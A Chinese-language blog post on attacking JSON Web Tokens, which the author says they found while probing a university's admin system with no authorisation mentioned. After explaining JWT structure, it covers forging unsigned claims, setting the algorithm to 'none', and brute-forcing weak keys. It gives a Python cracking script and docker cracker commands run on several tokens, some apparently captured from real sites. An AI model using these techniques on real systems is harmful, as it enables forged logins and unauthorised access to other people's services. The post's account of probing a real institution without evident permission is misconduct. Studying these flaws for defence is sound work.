#### JWT预编译

本狐狸在一次对西南某某大学的后台管理系统本来是要找一找目录遍历，偶然发现了这个JWT漏洞

[![oedmFK.png](https://z3.ax1x.com/2021/11/27/oedmFK.png)](https://imgtu.com/i/oedmFK)

[![oedlyd.png](https://z3.ax1x.com/2021/11/27/oedlyd.png)](https://imgtu.com/i/oedlyd)

##### 什么是 JWT？

JSON Web Token（JSON Web 令牌）是一种跨域验证身份的方案。JWT 不加密传输的数据，但能够通

过数字签名来验证数据未被篡改（但是做完下面的 WebGoat 练习后我对这一点表示怀疑）。

JWT 分为**三部分**，**头部**（Header），**声明**（Claims），**签名**（Signature），三个部分以英文句号.隔开。

JWT 的内容以 Base64URL 进行了编码。

**头部**（Header） 

~~~
{
"alg":"HS256",
"typ":"JWT"
}
alg
是说明这个 JWT 的签名使用的算法的参数，常见值用 HS256（默认），HS512 等，也可以为 None。HS256
表示 HMAC SHA256。
typ
说明这个 token 的类型为 JWT
~~~

**声明**（Claims） 

~~~
{
"exp": 1416471934,
"user_name": "user",
"scope": [
"read",
"write"
],
"authorities": [
"ROLE_ADMIN",
"ROLE_USER"
],
"jti": "9bc92a44-0b1a-4c5e-be70-da52075b9a84",
"client_id": "my-client-with-secret"
}
JWT 固定参数有：
iss：发行人
exp：到期时间
sub：主题
aud：用户
nbf：在此之前不可用
iat：发布时间
jti：JWT ID 用于标识该 JWT
~~~

**签名**（Signature）

服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容用此密

码进行加密，生成的字符串就是 JWT 的签名。

下面是一个用 HS256 生成 JWT 的代码例子

HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload),secret)

1、用户端登录，用户名和密码在请求中被发往服务器

2、（确认登录信息正确后）服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不

应写入密码，因为 JWT 是不加密的），并用 secret 用指定算法进行加密，生成该用户的 JWT。此时，

服务器并没有保存登录状态信息。

3、服务器将 JWT（通过响应）返回给客户端

4、用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中

5、服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态

6、服务器返回响应



###### 攻击 JWT，我常用三种手法：未校验签名、禁用哈希、暴破弱密钥

未校验签名。直接伪造nana用户名为admin，直接发送

https://jwt.io/

禁用哈希。JWT 第一部分含有 alg 字段，该字段指定生成签名采用哪种哈希算法，该站使用的是 HS256，可将该字段篡改为none，某些 JWT 的实现，一旦发现 alg 为 none，将不再生成哈希签名，自然不存在校验签名一说。另外，某些 JWT 实现对大小写敏感，所以，我继续尝试了 None、nOne、NONE，均报错。

~~~python
import jwt
import datetime

dic = {
    'exp': datetime.datetime.now() + datetime.timedelta(days=1),  # 过期时间
    'iat': datetime.datetime.now(),  #  开始时间
    'iss': 'lianzong',  # 签名
    'data': {  # 内容，一般存放该用户id和开始时间
        'a': 1,
        'b': 2,
    },
}

s = jwt.encode(dic, 'secret', algorithm='HS256')  # 加密生成字符串
print(s)
s = jwt.decode(s, 'secret', issuer='lianzong', algorithms=['HS256'])  # 解密，校验签名
print(s)
print(type(s))

~~~



#### jwt爆破

https://hub.fastgit.xyz/Ch1ngg/JWTPyCrack

##### 爆破脚本

~~~python
jwt_str = "xxx.ttt.zzz"
path = "D:/keys.txt"
alg = "HS256"

with open(path,encoding='utf-8') as f:
    for line in f:
        key_ = line.strip()
        try:
            jwt.decode(jwt_str,verify=True,key=key_,algorithm=alg)
            print('found key! --> ' +  key_)
            break
        except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):
            print('found key! --> ' +  key_)
            break
        except(jwt.exceptions.InvalidSignatureError):
            continue
    else:
        print("key not found!")
~~~



或者直接用github上项目

https://github.com/brendan-rius/c-jwt-cracker

~~~
docker run -it --rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
~~~

~~~
docker run -it --rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
~~~

~~~
docker run -it --rm  jwtcrack  AHAXTeyJhbGciOiJIUzUxMiJ9.eyJpZCI6MTY1Mjk1OTExNjAyMiwicmVnaXN0ZXJUeXBlIjowLCJ1c2VySWQiOjExMzgsImRldmljZSI6IndlYiIsImRldmljZUlkIjpudWxsfQ.HvxtNlR-qOED39EXqvJyMe_1O3dmdqddDwBHE9vuuh5grnGolScbfHrgIKQYdDbpznCSFKKPKrf17tcbrF7fWg
~~~

~~~
docker run -it --rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuaWtlTmFtZSI6ImJhdG1hbmZ1dHVyZSIsInVzZXJuYW1lIjoiYmF0bWFuZnV0dXJlIiwiZXhwIjoxNjU1MDkzOTEzLCJpc3MiOiJZb3Nha3VyYSJ9.vJsuxnoQfSwg88hnOv5oem4kHX8jQPVwY1YUIRCE95o
~~~









